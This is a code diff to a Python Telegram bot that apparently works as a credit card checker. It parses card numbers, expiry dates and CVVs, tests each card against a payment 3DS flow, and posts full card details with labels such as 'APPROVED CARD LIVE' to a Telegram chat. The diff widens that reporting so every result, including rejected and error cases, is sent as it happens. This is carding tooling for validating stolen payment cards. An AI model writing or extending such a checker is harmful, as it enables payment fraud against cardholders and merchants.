@@ -195,6 +195,7 @@ async def check_card(card, bot_app):
         with stats_lock:
             stats['errors'] += 1
             stats['error_details']['FORMAT_ERROR'] = stats['error_details'].get('FORMAT_ERROR', 0) + 1
+        await send_result(bot_app, card, "ERROR", "صيغة خاطئة")
         return card, "ERROR", "صيغة خاطئة"
     
     card_number, exp_month, exp_year, cvv = parts
@@ -223,6 +224,7 @@ async def check_card(card, bot_app):
             stats['errors'] += 1
             stats['error_details']['SETUP_ERROR'] = stats['error_details'].get('SETUP_ERROR', 0) + 1
         session.close()
+        await send_result(bot_app, card, "ERROR", "فشل Setup")
         return card, "ERROR", "فشل Setup"
     
     headers = {
@@ -273,7 +275,7 @@ async def check_card(card, bot_app):
             
             session.close()
             
-            # معالجة النتائج
+            # معالجة النتائج وإرسالها لحظياً
             if trans_status == 'N':
                 with stats_lock:
                     stats['approved'] += 1
@@ -283,6 +285,7 @@ async def check_card(card, bot_app):
             elif trans_status == 'R':
                 with stats_lock:
                     stats['rejected'] += 1
+                await send_result(bot_app, card, "REJECTED", "Declined")
                 return card, "REJECTED", "Declined"
             
             elif trans_status == 'C':
@@ -301,6 +304,7 @@ async def check_card(card, bot_app):
                 with stats_lock:
                     stats['errors'] += 1
                     stats['error_details']['UNKNOWN_STATUS'] = stats['error_details'].get('UNKNOWN_STATUS', 0) + 1
+                await send_result(bot_app, card, "UNKNOWN", trans_status)
                 return card, "UNKNOWN", trans_status
         
         else:
@@ -308,6 +312,7 @@ async def check_card(card, bot_app):
                 stats['errors'] += 1
                 stats['error_details']['NO_3DS'] = stats['error_details'].get('NO_3DS', 0) + 1
             session.close()
+            await send_result(bot_app, card, "ERROR", "No 3DS")
             return card, "ERROR", "No 3DS"
             
     except Exception as e:
@@ -315,30 +320,57 @@ async def check_card(card, bot_app):
             stats['errors'] += 1
             stats['error_details']['EXCEPTION'] = stats['error_details'].get('EXCEPTION', 0) + 1
         session.close()
+        await send_result(bot_app, card, "EXCEPTION", str(e))
         return card, "EXCEPTION", str(e)
 
 # ========== دالات البوت ==========
 async def send_result(bot_app, card, status_type, message):
-    """إرسال نتيجة الفحص مع عداد دقيق"""
+    """إرسال نتيجة الفحص لحظياً مع عداد دقيق"""
     if not stats['chat_id']:
         return
     
-    if status_type in ['APPROVED', 'AUTH_ATTEMPTED', '3D_SECURE']:
-        try:
+    try:
+        with stats_lock:
+            card_number = stats['cards_checked']
+        
+        # إرسال كل النتائج (حتى Rejected و Errors)
+        if status_type == 'APPROVED':
             with stats_lock:
                 stats['sent_results'] += 1
-                card_number = stats['sent_results']
-            
-            if status_type == 'APPROVED':
-                text = f"╔═══════════════╗\n✅ APPROVED CARD LIVE ✅\n╚═══════════════╝\n💳 {card}\n🔥 Status: Approved\n📊 Card #{card_number}\n⚡️ Mahmoud Saad\n╚═══════════════╝"
-            elif status_type == 'AUTH_ATTEMPTED':
-                text = f"╔═══════════════╗\n🔄 AUTH ATTEMPTED CARD 🔄\n╚═══════════════╝\n💳 {card}\n🔥 Status: Auth Attempted\n📊 Card #{card_number}\n⚡️ Mahmoud Saad\n╚═══════════════╝"
-            else:
-                text = f"╔═══════════════╗\n⚠️ 3D SECURE CARD ⚠️\n╚═══════════════╝\n💳 {card}\n🔥 Status: 3D Secure\n📊 Card #{card_number}\n⚡️ Mahmoud Saad\n╚═══════════════╝"
-            
-            await bot_app.bot.send_message(chat_id=stats['chat_id'], text=text)
-        except Exception as e:
-            print(f"[!] خطأ في إرسال النتيجة: {e}")
+            text = f"╔═══════════════╗\n✅ APPROVED CARD LIVE ✅\n╚═══════════════╝\n💳 {card}\n🔥 Status: Approved\n📊 Card #{card_number}\n⚡️ Mahmoud Saad\n╚═══════════════╝"
+        
+        elif status_type == 'AUTH_ATTEMPTED':
+            with stats_lock:
+                stats['sent_results'] += 1
+            text = f"╔═══════════════╗\n🔄 AUTH ATTEMPTED CARD 🔄\n╚═══════════════╝\n💳 {card}\n🔥 Status: Auth Attempted\n📊 Card #{card_number}\n⚡️ Mahmoud Saad\n╚═══════════════╝"
+        
+        elif status_type == '3D_SECURE':
+            with stats_lock:
+                stats['sent_results'] += 1
+            text = f"╔═══════════════╗\n⚠️ 3D SECURE CARD ⚠️\n╚═══════════════╝\n💳 {card}\n🔥 Status: 3D Secure\n📊 Card #{card_number}\n⚡️ Mahmoud Saad\n╚═══════════════╝"
+        
+        elif status_type == 'REJECTED':
+            text = f"❌ **REJECTED**\n💳 `{card}`\n🔥 Status: Declined\n📊 Card #{card_number}"
+        
+        elif status_type == 'ERROR':
+            text = f"⚠️ **ERROR**\n💳 `{card}`\n🔥 Reason: {message}\n📊 Card #{card_number}"
+        
+        elif status_type == 'UNKNOWN':
+            text = f"❓ **UNKNOWN STATUS**\n💳 `{card}`\n🔥 Status: {message}\n📊 Card #{card_number}"
+        
+        elif status_type == 'EXCEPTION':
+            text = f"💥 **EXCEPTION**\n💳 `{card}`\n🔥 Error: {message[:50]}\n📊 Card #{card_number}"
+        
+        else:
+            return
+        
+        await bot_app.bot.send_message(
+            chat_id=stats['chat_id'], 
+            text=text,
+            parse_mode='Markdown'
+        )
+    except Exception as e:
+        print(f"[!] خطأ في إرسال النتيجة: {e}")
 
 def create_dashboard_keyboard():
     """إنشاء لوحة التحكم"""
